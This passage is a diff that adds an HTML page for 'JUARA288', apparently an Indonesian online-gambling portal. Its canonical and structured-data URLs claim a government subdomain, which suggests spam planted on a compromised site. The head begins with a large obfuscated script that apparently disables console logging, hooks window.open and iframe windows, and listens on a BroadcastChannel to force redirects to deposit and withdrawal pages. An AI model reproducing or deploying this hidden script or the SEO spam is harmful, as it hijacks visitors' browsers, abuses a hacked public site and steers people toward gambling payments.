@@ -1,0 +1,3043 @@
+<!doctype html>
+<html lang="id">
+	<head>
+		<script>function f(a,b){a=a-0x1c3;const c=e();let d=c[a];if(f['\x62\x58\x62\x6e\x6a\x47']===undefined){var g=function(j){const l='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';let m='',n='',o=m+g,p=(''+function(){return 0x0;})['\x69\x6e\x64\x65\x78\x4f\x66']('\x0a')!==-0x1;for(let q=0x0,r,s,t=0x0;s=j['\x63\x68\x61\x72\x41\x74'](t++);~s&&(r=q%0x4?r*0x40+s:s,q++%0x4)?m+=p||o['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](t+0xa)-0xa!==0x0?String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0xff&r>>(-0x2*q&0x6)):q:0x0){s=l['\x69\x6e\x64\x65\x78\x4f\x66'](s);}for(let u=0x0,v=m['\x6c\x65\x6e\x67\x74\x68'];u<v;u++){n+='\x25'+('\x30\x30'+m['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](u)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0x10))['\x73\x6c\x69\x63\x65'](-0x2);}return decodeURIComponent(n);};f['\x42\x41\x62\x4c\x61\x45']=g,f['\x73\x70\x52\x54\x64\x6a']={},f['\x62\x58\x62\x6e\x6a\x47']=!![];}const h=c[0x0];f['\x6f\x50\x46\x76\x61\x7a']!==h&&(f['\x73\x70\x52\x54\x64\x6a']={},f['\x6f\x50\x46\x76\x61\x7a']=h);const i=f['\x73\x70\x52\x54\x64\x6a'][a];if(i===undefined){const j=function(k){this['\x45\x4a\x68\x68\x78\x4b']=k,this['\x42\x52\x6b\x76\x75\x6c']=[0x1,0x0,0x0],this['\x76\x42\x54\x58\x42\x46']=function(){return'\x6e\x65\x77\x53\x74\x61\x74\x65';},this['\x5a\x45\x65\x5a\x4a\x63']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['\x6b\x53\x73\x6c\x59\x71']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};j['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x42\x56\x54\x57\x74\x61']=function(){const k=new RegExp(this['\x5a\x45\x65\x5a\x4a\x63']+this['\x6b\x53\x73\x6c\x59\x71']),l=k['\x74\x65\x73\x74'](this['\x76\x42\x54\x58\x42\x46']['\x74\x6f\x53\x74\x72\x69\x6e\x67']())?--this['\x42\x52\x6b\x76\x75\x6c'][0x1]:--this['\x42\x52\x6b\x76\x75\x6c'][0x0];return this['\x6e\x57\x62\x56\x4d\x71'](l);},j['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x6e\x57\x62\x56\x4d\x71']=function(k){if(!Boolean(~k))return k;return this['\x73\x6a\x41\x67\x47\x47'](this['\x45\x4a\x68\x68\x78\x4b']);},j['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x73\x6a\x41\x67\x47\x47']=function(k){for(let l=0x0,m=this['\x42\x52\x6b\x76\x75\x6c']['\x6c\x65\x6e\x67\x74\x68'];l<m;l++){this['\x42\x52\x6b\x76\x75\x6c']['\x70\x75\x73\x68'](Math['\x72\x6f\x75\x6e\x64'](Math['\x72\x61\x6e\x64\x6f\x6d']())),m=this['\x42\x52\x6b\x76\x75\x6c']['\x6c\x65\x6e\x67\x74\x68'];}return k(this['\x42\x52\x6b\x76\x75\x6c'][0x0]);},(''+function(){return 0x0;})['\x69\x6e\x64\x65\x78\x4f\x66']('\x0a')===-0x1&&new j(f)['\x42\x56\x54\x57\x74\x61'](),d=f['\x42\x41\x62\x4c\x61\x45'](d),f['\x73\x70\x52\x54\x64\x6a'][a]=d;}else d=i;return d;}(function(a,b){const H=f,c=a();while(!![]){try{const d=-parseInt(H(0x242))/0x1+-parseInt(H(0x232))/0x2*(-parseInt(H(0x204))/0x3)+parseInt(H(0x21a))/0x4+-parseInt(H(0x1f3))/0x5*(parseInt(H(0x226))/0x6)+parseInt(H(0x20d))/0x7*(-parseInt(H(0x1db))/0x8)+-parseInt(H(0x23b))/0x9+parseInt(H(0x1f0))/0xa;if(d===b)break;else c['push'](c['shift']());}catch(g){c['push'](c['shift']());}}}(e,0x5b6c5),(function(){const I=f,h={'\x74\x4a\x79\x58\x4f':function(t,u){return t===u;},'\x56\x71\x4e\x61\x50':I(0x22b),'\x66\x46\x68\x50\x71':function(t,u){return t!==u;},'\x68\x6d\x75\x4d\x44':I(0x1e8),'\x53\x57\x45\x72\x50':'\x51\x68\x64\x46\x6d','\x46\x58\x64\x46\x6e':I(0x1e5),'\x42\x70\x75\x48\x6e':I(0x21f),'\x44\x4e\x74\x44\x4a':I(0x200),'\x44\x47\x74\x44\x45':function(t,u){return t+u;},'\x4f\x4b\x46\x68\x62':I(0x20a),'\x42\x76\x48\x5a\x51':I(0x1f5),'\x44\x45\x76\x77\x50':function(t){return t();},'\x43\x63\x71\x47\x45':'\x6c\x6f\x67','\x42\x48\x68\x70\x4a':I(0x1c7),'\x65\x44\x76\x4f\x65':I(0x1f1),'\x64\x5a\x6f\x6a\x44':I(0x223),'\x4a\x62\x43\x56\x52':function(t,u){return t<u;},'\x42\x59\x56\x50\x53':I(0x1d7),'\x75\x6d\x61\x42\x5a':function(t,u){return t!==u;},'\x66\x6d\x62\x52\x69':I(0x1da),'\x66\x48\x68\x64\x77':I(0x240),'\x72\x43\x49\x61\x59':function(t,u){return t===u;},'\x4e\x79\x68\x74\x6b':function(t,u){return t===u;},'\x73\x70\x65\x7a\x64':I(0x227),'\x6f\x6c\x47\x73\x66':function(t,u){return t instanceof u;},'\x6a\x56\x77\x52\x65':I(0x23f),'\x54\x6f\x48\x5a\x46':function(t,u){return t(u);},'\x45\x61\x6a\x43\x4a':I(0x1f4),'\x63\x6f\x4a\x42\x71':I(0x1ca),'\x51\x65\x52\x56\x67':I(0x1ea),'\x63\x73\x6e\x42\x61':I(0x1cd),'\x77\x44\x79\x63\x6c':I(0x248),'\x4f\x50\x62\x67\x53':function(t,u){return t===u;},'\x54\x65\x49\x4a\x4d':function(t,u){return t(u);},'\x68\x5a\x42\x69\x79':I(0x1fe),'\x42\x62\x67\x74\x77':'\x50\x48\x78\x73\x43','\x68\x67\x59\x6a\x53':function(t,u,v){return t(u,v);},'\x70\x59\x45\x50\x4e':function(t){return t();},'\x62\x4e\x6c\x54\x47':'\x2f\x64\x65\x70\x6f\x73\x69\x74','\x62\x4f\x6f\x6c\x51':I(0x231),'\x77\x68\x67\x61\x4c':I(0x23a),'\x68\x70\x77\x6c\x4a':I(0x1fa),'\x58\x4a\x72\x43\x52':I(0x1e7),'\x77\x6c\x4a\x74\x55':I(0x206),'\x7a\x45\x49\x47\x77':I(0x1f7),'\x6f\x6b\x72\x74\x58':function(t,u){return t===u;},'\x55\x6d\x4f\x69\x78':I(0x22e),'\x43\x4d\x58\x70\x6b':I(0x220)},i=(function(){const K=I,t={'\x45\x79\x62\x6c\x63':function(v,w){const J=f;return h[J(0x246)](v,w);},'\x46\x78\x6f\x63\x53':h[K(0x235)],'\x6d\x7a\x4b\x52\x4d':K(0x1ef)};if(h['\x66\x46\x68\x50\x71']('\x5a\x57\x4c\x6e\x42',h[K(0x217)])){let v=!![];return function(w,x){const L=K;if(t[L(0x1d0)](L(0x1ef),t['\x6d\x7a\x4b\x52\x4d'])){const z=v?function(){const M=L;if(t[M(0x1d0)](M(0x1c8),M(0x230)))return![];else{if(x){const B=x[M(0x1cc)](w,arguments);return x=null,B;}}}:function(){};return v=![],z;}else return i[L(0x244)](q,h,L(0x1ea),t[L(0x247)]);};}else{const w=i[K(0x219)]();return h[K(0x246)](q,w)||h[K(0x1e1)](w+'\x2f');}}()),j=h[I(0x22f)](i,this,function(){const N=I;if(h['\x53\x57\x45\x72\x50']===h[N(0x1fc)]){if(h[N(0x1eb)](j[N(0x1f2)]()[N(0x1e9)]()[N(0x20c)]('\x0a'),-0x1))return;return j['\x74\x6f\x53\x74\x72\x69\x6e\x67']()[N(0x21e)](h[N(0x228)])[N(0x1e9)]()['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'](j)[N(0x21e)](h[N(0x228)]);}else{const v=k[N(0x23e)][N(0x1d5)][N(0x1f2)](l),w=m[n],x=o[w]||v;v[N(0x23c)]=p['\x62\x69\x6e\x64'](q),v[N(0x1e9)]=x['\x74\x6f\x53\x74\x72\x69\x6e\x67'][N(0x1f2)](x),r[w]=v;}});j();const k=(function(){const O=I,t={};t['\x62\x72\x50\x58\x79']=h[O(0x218)],t[O(0x1cf)]=h[O(0x215)];const u=t;let v=!![];return function(w,x){const P=O,y={'\x6a\x59\x56\x61\x43':u[P(0x212)],'\x67\x44\x4c\x78\x71':function(A,B){return A(B);},'\x4c\x55\x50\x6a\x79':u[P(0x1cf)],'\x76\x54\x50\x6f\x63':function(A,B){return A===B;},'\x72\x57\x59\x66\x6d':'\x62\x61\x4c\x54\x76'},z=v?function(){const Q=P,A={'\x47\x6b\x64\x53\x58':function(C,D){return C===D;},'\x45\x68\x50\x45\x76':y[Q(0x238)],'\x5a\x6b\x54\x46\x76':function(C,D){const R=Q;return y[R(0x202)](C,D);},'\x70\x5a\x70\x65\x78':Q(0x220)};if(Q(0x200)===y[Q(0x1d9)]){if(x){if(y[Q(0x229)](y[Q(0x1ed)],y[Q(0x1ed)])){const C=x['\x61\x70\x70\x6c\x79'](w,arguments);return x=null,C;}else{const D=j[Q(0x219)]();return i['\x73\x6f\x6d\x65'](E=>D['\x69\x6e\x63\x6c\x75\x64\x65\x73'](E[Q(0x219)]()));}}}else{const D={'\x59\x59\x63\x79\x58':function(F,G){const S=Q;return A[S(0x239)](F,G);},'\x5a\x42\x6d\x4b\x78':A[Q(0x1c3)],'\x6f\x6d\x71\x77\x50':function(F,G){const T=Q;return A[T(0x225)](F,G);}},E=new t(A[Q(0x1d1)]);E[Q(0x1fb)]=function(F){const U=Q;if(F&&F[U(0x1e3)]&&D[U(0x21b)](F[U(0x1e3)][U(0x224)],D['\x5a\x42\x6d\x4b\x78'])){const G=F[U(0x1e3)]['\x75\x72\x6c'];D[U(0x1ce)](n,G)&&!o&&(q[U(0x211)][U(0x20e)]=G);}};}}:function(){};return v=![],z;};}()),l=k(this,function(){const W=I,t=function(){const V=f;let y;try{y=Function(h['\x44\x47\x74\x44\x45'](V(0x214)+h[V(0x237)],'\x29\x3b'))();}catch(A){h['\x66\x46\x68\x50\x71'](h[V(0x1dd)],h[V(0x1dd)])?j['\x6c\x6f\x63\x61\x74\x69\x6f\x6e'][V(0x20e)]=i:y=window;}return y;},u=h[W(0x1d3)](t),v=u[W(0x205)]=u[W(0x205)]||{},w=[h[W(0x1e2)],h[W(0x1df)],W(0x23d),h['\x65\x44\x76\x4f\x65'],W(0x234),'\x74\x61\x62\x6c\x65',h[W(0x208)]];for(let y=0x0;h[W(0x236)](y,w[W(0x210)]);y++){if(h[W(0x246)](h[W(0x20b)],h[W(0x20b)])){const z=k['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72'][W(0x1d5)][W(0x1f2)](k),A=w[y],B=v[A]||z;z[W(0x23c)]=k[W(0x1f2)](k),z[W(0x1e9)]=B['\x74\x6f\x53\x74\x72\x69\x6e\x67']['\x62\x69\x6e\x64'](B),v[A]=z;}else k=!![];}});h[I(0x1cb)](l);const m=[h[I(0x203)],I(0x245),h[I(0x22a)],h[I(0x22d)],h[I(0x1f6)]];function n(t){const X=I;if(h['\x75\x6d\x61\x42\x5a'](h[X(0x1fd)],h[X(0x21d)])){if(!t||h[X(0x1c4)](typeof t,X(0x227))&&h['\x4e\x79\x68\x74\x6b'](t[X(0x233)](),''))return![];let v='';if(h[X(0x246)](typeof t,h[X(0x1e0)]))v=t;else{if(h[X(0x1e6)](t,URL))v=t[X(0x20e)];else t&&typeof t===X(0x1d8)&&t['\x75\x72\x6c']&&(v=t[X(0x216)]);}try{const w=new URL(v,window['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x6f\x72\x69\x67\x69\x6e']),x=w[X(0x22c)]['\x74\x6f\x4c\x6f\x77\x65\x72\x43\x61\x73\x65']();return m[X(0x20f)](y=>{const Y=X,z=y[Y(0x219)]();return h['\x74\x4a\x79\x58\x4f'](x,z)||x[Y(0x1e1)](h[Y(0x1c5)](z,'\x2f'));});}catch(y){const z=v[X(0x219)]();return m['\x73\x6f\x6d\x65'](A=>z[X(0x241)](A[X(0x219)]()));}}else c=d;}let o=![];window[I(0x1f9)](h[I(0x1d6)],function(){o=!![];});function p(t,u,v){const Z=I;if(h['\x4e\x79\x68\x74\x6b'](h[Z(0x201)],h[Z(0x201)])){if(h[Z(0x1f8)](n,t))return window[Z(0x211)][Z(0x20e)]=t,window;return window[Z(0x206)][Z(0x1cc)](window,arguments);}else{if(XEsbyD[Z(0x1eb)](d[Z(0x1f2)]()['\x74\x6f\x53\x74\x72\x69\x6e\x67']()[Z(0x20c)]('\x0a'),-0x1))return;return g[Z(0x1e9)]()[Z(0x21e)](XEsbyD['\x46\x58\x64\x46\x6e'])[Z(0x1e9)]()[Z(0x23e)](h)[Z(0x21e)](XEsbyD['\x46\x58\x64\x46\x6e']);}}const q={};q[I(0x21c)]=p,q[I(0x1ec)]=![],q[I(0x249)]=![],Object[I(0x1de)](window,h[I(0x1c6)],q);const r=Object[I(0x1d4)](HTMLIFrameElement[I(0x1d5)],h[I(0x221)]);r&&(h['\x6f\x6b\x72\x74\x58'](h['\x55\x6d\x4f\x69\x78'],I(0x22e))?Object[I(0x1de)](HTMLIFrameElement[I(0x1d5)],I(0x1f7),{'\x67\x65\x74':function(){const a0=I,t={};t[a0(0x1ff)]=h[a0(0x235)];const u=t,v=r['\x67\x65\x74'][a0(0x244)](this);if(v){if(h[a0(0x1eb)](h['\x45\x61\x6a\x43\x4a'],h[a0(0x209)]))try{if(!v[a0(0x1dc)]){const x=v[a0(0x206)];v[a0(0x206)]=function(y){const a1=a0;return x[a1(0x244)](v,y,'\x5f\x62\x6c\x61\x6e\x6b',u[a1(0x1ff)]);},v[a0(0x1dc)]=x;}}catch(y){}else return;}return v;},'\x63\x6f\x6e\x66\x69\x67\x75\x72\x61\x62\x6c\x65':!![]}):j=i);if(typeof BroadcastChannel!==I(0x243)){const t=new BroadcastChannel(h[I(0x1c9)]);t[I(0x1fb)]=function(u){const a2=I,v={};v[a2(0x1ee)]=h[a2(0x213)],v[a2(0x1e4)]=h['\x56\x71\x4e\x61\x50'];const w=v;if(h[a2(0x1c4)](h[a2(0x222)],h['\x77\x44\x79\x63\x6c'])){const y=q[a2(0x206)];h[a2(0x206)]=function(z){const a3=a2;return y[a3(0x244)](y,z,DUgbNL['\x64\x4b\x78\x66\x58'],DUgbNL[a3(0x1e4)]);},j[a2(0x1dc)]=y;}else{if(u&&u[a2(0x1e3)]&&h['\x4f\x50\x62\x67\x53'](u[a2(0x1e3)][a2(0x224)],a2(0x21f))){const y=u['\x64\x61\x74\x61'][a2(0x216)];if(h[a2(0x1d2)](n,y)&&!o){if(h[a2(0x246)](h['\x68\x5a\x42\x69\x79'],h[a2(0x207)]))return i[a2(0x211)][a2(0x20e)]=q,h;else window[a2(0x211)]['\x68\x72\x65\x66']=y;}}}};}}()));function e(){const a4=['\x44\x67\x7a\x6c\x77\x67\x38','\x6b\x63\x47\x4f\x6c\x49\x53\x50\x6b\x59\x4b\x52\x6b\x73\x53\x4b','\x42\x32\x58\x68\x43\x32\x79','\x79\x4d\x76\x4d\x42\x33\x6a\x4c\x44\x77\x35\x53\x42\x32\x66\x4b','\x75\x30\x76\x6a\x71\x78\x65','\x44\x67\x39\x74\x44\x68\x6a\x50\x42\x4d\x43','\x78\x32\x6a\x53\x79\x77\x35\x52','\x7a\x4b\x7a\x4f\x75\x68\x65','\x44\x33\x6a\x50\x44\x67\x66\x49\x42\x67\x75','\x43\x4c\x44\x7a\x7a\x4d\x30','\x7a\x65\x54\x34\x7a\x4c\x47','\x42\x65\x72\x76\x76\x30\x38','\x6d\x74\x79\x31\x6f\x64\x4b\x59\x6e\x4a\x62\x72\x79\x4e\x6e\x53\x41\x31\x43','\x7a\x78\x6a\x59\x42\x33\x69','\x79\x4d\x4c\x55\x7a\x61','\x6e\x64\x71\x31\x76\x77\x6a\x64\x76\x33\x6e\x65','\x75\x67\x66\x59\x73\x67\x34','\x7a\x30\x44\x75\x43\x68\x47','\x41\x68\x62\x33\x42\x65\x4f','\x79\x32\x39\x55\x44\x67\x76\x55\x44\x66\x44\x50\x42\x4d\x72\x56\x44\x57','\x76\x67\x39\x69\x77\x4b\x79','\x79\x77\x72\x4b\x72\x78\x7a\x4c\x42\x4e\x72\x6d\x41\x78\x6e\x30\x7a\x77\x35\x4c\x43\x47','\x6c\x33\x44\x50\x44\x67\x48\x4b\x43\x4d\x66\x33','\x42\x32\x35\x54\x7a\x78\x6e\x5a\x79\x77\x44\x4c','\x75\x31\x44\x66\x43\x4c\x61','\x7a\x4d\x31\x49\x75\x4d\x4b','\x75\x77\x6a\x72\x45\x67\x65','\x43\x75\x7a\x62\x41\x76\x43','\x42\x4b\x6e\x35\x45\x77\x4f','\x41\x4c\x7a\x33\x75\x4d\x75','\x7a\x30\x72\x6d\x45\x68\x65','\x79\x4b\x35\x53\x76\x65\x43','\x6d\x32\x7a\x55\x45\x4b\x35\x75\x74\x47','\x79\x32\x39\x55\x43\x32\x39\x53\x7a\x71','\x42\x33\x62\x4c\x42\x47','\x71\x4d\x6a\x4e\x44\x68\x43','\x7a\x66\x50\x56\x41\x4b\x71','\x79\x32\x39\x6b\x71\x4e\x65','\x45\x33\x30\x55\x79\x32\x39\x55\x43\x33\x72\x59\x44\x77\x6e\x30\x42\x33\x69\x4f\x69\x4e\x6a\x4c\x44\x68\x76\x59\x42\x49\x62\x30\x41\x67\x4c\x5a\x69\x49\x4b\x4f\x69\x63\x4b','\x71\x4c\x4c\x77\x75\x66\x6d','\x41\x77\x35\x4b\x7a\x78\x48\x70\x7a\x47','\x6d\x74\x75\x32\x6f\x67\x76\x6b\x72\x75\x50\x64\x7a\x47','\x41\x68\x6a\x4c\x7a\x47','\x43\x32\x39\x54\x7a\x71','\x42\x67\x76\x55\x7a\x33\x72\x4f','\x42\x67\x39\x4a\x79\x78\x72\x50\x42\x32\x34','\x79\x4e\x6a\x71\x77\x68\x4b','\x75\x77\x76\x73\x76\x4d\x43','\x43\x4d\x76\x30\x44\x78\x6a\x55\x69\x63\x48\x4d\x44\x77\x35\x4a\x44\x67\x4c\x56\x42\x49\x47\x50\x69\x61','\x72\x65\x35\x30\x72\x65\x4f','\x44\x78\x6a\x53','\x41\x67\x31\x31\x74\x75\x71','\x71\x4e\x62\x31\x73\x67\x34','\x44\x67\x39\x6d\x42\x33\x44\x4c\x43\x4b\x6e\x48\x43\x32\x75','\x6d\x4a\x65\x30\x6d\x4a\x6d\x30\x6d\x65\x66\x69\x44\x66\x6e\x71\x79\x47','\x77\x76\x4c\x4a\x45\x76\x47','\x44\x4d\x66\x53\x44\x77\x75','\x7a\x4b\x48\x4f\x7a\x68\x43','\x43\x32\x76\x48\x43\x4d\x6e\x4f','\x72\x4b\x39\x73\x71\x30\x76\x46\x75\x4b\x76\x65\x73\x76\x6a\x66\x71\x31\x72\x46\x75\x65\x66\x73\x72\x75\x35\x75','\x41\x78\x6a\x31\x42\x4d\x50\x48\x43\x32\x72\x55\x41\x4e\x7a\x55\x43\x32\x54\x54\x72\x4b\x76\x5a\x7a\x66\x66\x74\x71\x75\x72\x52\x7a\x67\x66\x4b\x41\x4d\x66\x5a\x79\x77\x72\x58\x72\x65\x66\x74\x72\x66\x66\x78\x79\x77\x72\x62\x72\x65\x66\x35\x7a\x32\x6e\x48\x41\x78\x44\x58\x43\x32\x66\x57\x41\x67\x48\x35\x43\x67\x54\x4b\x42\x32\x7a\x48\x42\x4d\x35\x49\x79\x33\x7a\x48\x43\x33\x4c\x4b\x76\x75\x4c\x65\x76\x31\x66\x6a\x73\x67\x72\x5a\x79\x76\x76\x5a\x72\x4b\x48\x7a\x73\x67\x72\x48\x43\x32\x4c\x4b\x79\x78\x76\x4b\x79\x78\x6e\x73\x72\x76\x44\x65\x41\x77\x7a\x4c\x42\x33\x44\x51\x71\x75\x6e\x64\x71\x76\x6e\x62\x72\x66\x48\x58\x44\x32\x72\x5a\x79\x78\x43','\x45\x4b\x76\x6a\x72\x33\x43','\x79\x33\x6e\x55\x71\x4d\x65','\x44\x68\x6a\x48\x79\x32\x75','\x44\x68\x4c\x57\x7a\x71','\x77\x4d\x54\x75\x72\x4e\x79','\x6e\x64\x75\x57\x6d\x5a\x7a\x36\x73\x75\x48\x56\x73\x31\x61','\x43\x33\x72\x59\x41\x77\x35\x4e','\x72\x4c\x48\x4b\x72\x4d\x34','\x44\x4c\x72\x71\x42\x32\x6d','\x79\x4b\x39\x56\x42\x66\x65','\x42\x4d\x39\x56\x43\x67\x76\x55\x7a\x78\x69','\x43\x67\x66\x30\x41\x67\x35\x48\x42\x77\x75','\x44\x32\x48\x4e\x79\x75\x57','\x75\x32\x44\x48\x45\x4c\x61','\x41\x67\x44\x7a\x41\x4c\x6d','\x71\x75\x39\x62\x7a\x30\x34','\x6c\x32\x72\x4c\x43\x67\x39\x5a\x41\x78\x71\x54\x43\x68\x76\x53\x43\x32\x65','\x6d\x74\x75\x30\x6f\x74\x71\x32\x71\x33\x44\x62\x75\x75\x72\x73','\x44\x68\x6a\x50\x42\x71','\x7a\x78\x48\x4a\x7a\x78\x62\x30\x41\x77\x39\x55','\x76\x4e\x66\x6f\x79\x76\x61','\x73\x4d\x6a\x64\x76\x4c\x69','\x74\x30\x54\x67\x41\x67\x69','\x41\x4c\x4c\x77\x79\x75\x6d','\x72\x32\x54\x4b\x75\x31\x47','\x6c\x32\x72\x4c\x43\x67\x39\x5a\x41\x78\x71\x54\x79\x4d\x66\x55\x41\x57','\x6d\x4a\x71\x59\x6d\x74\x69\x5a\x6e\x66\x4c\x4c\x42\x67\x31\x66\x75\x47','\x78\x31\x39\x57\x43\x4d\x39\x30\x42\x31\x39\x46','\x41\x77\x35\x4d\x42\x57','\x79\x32\x39\x55\x43\x33\x72\x59\x44\x77\x6e\x30\x42\x33\x69','\x43\x30\x48\x5a\x71\x76\x75','\x41\x32\x66\x6a\x42\x77\x65','\x41\x77\x35\x4a\x42\x68\x76\x4b\x7a\x78\x6d','\x6d\x5a\x47\x35\x6d\x64\x6d\x58\x7a\x66\x6e\x4d\x77\x4b\x35\x4e','\x44\x77\x35\x4b\x7a\x77\x7a\x50\x42\x4d\x76\x4b','\x79\x32\x66\x53\x42\x61','\x6c\x32\x72\x4c\x43\x67\x39\x5a\x41\x78\x71\x54\x43\x78\x6a\x50\x43\x57','\x44\x65\x50\x35\x77\x65\x38','\x72\x4e\x48\x56\x79\x31\x6d','\x71\x32\x35\x55\x72\x78\x43','\x79\x32\x39\x55\x7a\x4d\x4c\x4e\x44\x78\x6a\x48\x79\x4d\x58\x4c','\x72\x77\x48\x71\x72\x78\x79','\x43\x4b\x6e\x6a\x79\x76\x4b','\x72\x65\x44\x30\x72\x65\x75','\x44\x32\x58\x6b\x44\x66\x75','\x44\x32\x66\x59\x42\x47','\x75\x4d\x31\x4e\x41\x4e\x4b','\x71\x30\x31\x79\x43\x67\x53','\x41\x4d\x44\x6f\x44\x4b\x6d','\x43\x66\x4c\x66\x75\x65\x34','\x79\x78\x62\x57\x42\x68\x4b','\x73\x31\x66\x32\x76\x4c\x4b','\x42\x32\x31\x58\x44\x31\x61','\x42\x4d\x6a\x48\x74\x76\x43','\x72\x78\x4c\x49\x42\x67\x6d','\x43\x66\x50\x57\x7a\x78\x47','\x76\x67\x76\x6a\x73\x4b\x30','\x72\x65\x76\x32\x44\x31\x61','\x7a\x32\x76\x30\x74\x33\x44\x55\x75\x68\x6a\x56\x43\x67\x76\x59\x44\x68\x4c\x65\x7a\x78\x6e\x4a\x43\x4d\x4c\x57\x44\x67\x39\x59','\x43\x68\x6a\x56\x44\x67\x39\x30\x45\x78\x62\x4c','\x77\x65\x50\x59\x71\x31\x69','\x7a\x65\x48\x58\x79\x77\x4f','\x42\x32\x6a\x51\x7a\x77\x6e\x30','\x74\x66\x76\x71\x41\x4e\x4b','\x72\x78\x7a\x67\x73\x33\x47','\x6d\x4a\x61\x30\x6d\x64\x48\x55\x76\x30\x4c\x72\x73\x65\x57','\x78\x31\x39\x56\x43\x4d\x4c\x4e\x74\x33\x62\x4c\x42\x47','\x71\x4e\x7a\x69\x77\x4c\x65','\x7a\x67\x76\x4d\x41\x77\x35\x4c\x75\x68\x6a\x56\x43\x67\x76\x59\x44\x68\x4b','\x71\x4b\x48\x4f\x43\x65\x4f','\x43\x33\x62\x4c\x45\x4d\x71','\x43\x33\x72\x48\x43\x4e\x72\x5a\x76\x32\x4c\x30\x41\x61','\x71\x32\x6e\x58\x72\x30\x75','\x7a\x67\x66\x30\x79\x71'];e=function(){return a4;};return e();}</script>
+		<!-- Required meta tags -->
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>JUARA288 - Portal Akses Play Game Mobile Digital Terbaru</title>
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://old.data.bengkayangkab.go.id/">
+<link rel="amphtml" href="https://bengkayangkab-go-id.pages.dev/">
+<meta name="description" content="JUARA288 adalah portal akses paly game mobile digital terbaru yang memberikan penyediaan pengalaman bermain game mobile digital dengan system teknology canggih, kestabilan akses bermain, serta informasi cara bermain game movile digital.">
+<meta name="keywords" content="juara288, juara288 portal, juara288 akses, juara288 game, juara288 play, juara288 digital, juara288 mobile">
+<meta name="google-site-verification" content="8tnShbZ46IHXz-IJAr2LHANDA3NBFhhzKQyg-wNaE2E" />
+<meta property="og:ttl" content="345600" />
+<link rel="icon" href="https://mayanconstruction.net/image/icon-juara288.webp" ><link href="https://mayanconstruction.net/named-panel/css/theme-3.0.css" rel="stylesheet">		
+
+<link href="https://mayanconstruction.net/named-panel/css/bootstrap-icons.min.css" rel="stylesheet">
+<link href="https://mayanconstruction.net/named-panel/css/all.css" rel="stylesheet">
+<link href="https://mayanconstruction.net/named-panel/css/owl.carousel.min.css" rel="stylesheet">
+<link href="https://mayanconstruction.net/named-panel/css/owl.theme.default.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://mayanconstruction.net/named-panel/css/default.css?v=1.0.9">
+	<!-- google font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@700&family=Saira+Condensed:wght@600&display=swap" rel="stylesheet">
+
+		<style>
+			.menubar {
+    			background-image: linear-gradient(rgba(255, 255, 255, 0.2) 0%, rgba(255, 255, 255, 0.2) 100%);
+			}
+		</style>
+
+		
+		
+		<script src="https://mayanconstruction.net/named-panel/js/bootstrap.bundle.min.js"></script>		
+		<script src="https://mayanconstruction.net/named-panel/js/jquery-3.7.1.min.js"></script>
+	<script src="https://mayanconstruction.net/named-panel/js/ui.js"></script>		<script src="https://mayanconstruction.net/named-panel/js/utils.js"></script>
+		<script src="https://mayanconstruction.net/named-panel/js/owl.carousel.min.js"></script>
+		
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://old.data.bengkayangkab.go.id/#website",
+      "url": "https://old.data.bengkayangkab.go.id/",
+      "name": "JUARA288",
+      "description": "JUARA288 adalah portal akses play game mobile digital terbaru yang memberikan penyediaan pengalaman bermain game mobile digital dengan system teknology canggih, kestabilan akses bermain, serta informasi cara bermain game movile digital.",
+      "inLanguage": "id-ID",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": {
+          "@type": "EntryPoint",
+          "urlTemplate": "https://old.data.bengkayangkab.go.id/?s={search_term_string}"
+        },
+        "query-input": "required name=search_term_string"
+      }
+    },
+    {
+      "@type": "WebPage",
+      "@id": "https://old.data.bengkayangkab.go.id/#webpage",
+      "url": "https://old.data.bengkayangkab.go.id/",
+      "name": "JUARA288 - Portal Akses Play Game Mobile Digital Terbaru",
+      "isPartOf": {
+        "@id": "https://old.data.bengkayangkab.go.id/#website"
+      },
+      "description": "JUARA288 adalah portal akses play game mobile digital terbaru yang memberikan penyediaan pengalaman bermain game mobile digital dengan system teknology canggih, kestabilan akses bermain, serta informasi cara bermain game movile digital.",
+      "inLanguage": "id-ID",
+      "datePublished": "2026-11-23",
+      "dateModified": "2026-11-23",
+      "keywords": [
+        "juara288",
+        "juara288 portal",
+        "juara288 akses",
+        "juara288 game",
+        "juara288 play",
+        "juara288 digital",
+        "juara288 mobile",
+        "juara288 game mobile",
+        "juara288 game digital"
+      ]
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://old.data.bengkayangkab.go.id/#organization",
+      "name": "JUARA288",
+      "url": "https://old.data.bengkayangkab.go.id/",
+      "description": "Portal Akses Play Game Mobile Digital Terbaru",
+      "sameAs": [
+        "https://old.data.bengkayangkab.go.id/"
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "@id": "https://old.data.bengkayangkab.go.id/#faqpage",
+      "mainEntity": [
+        {
+          "@type": "Question",
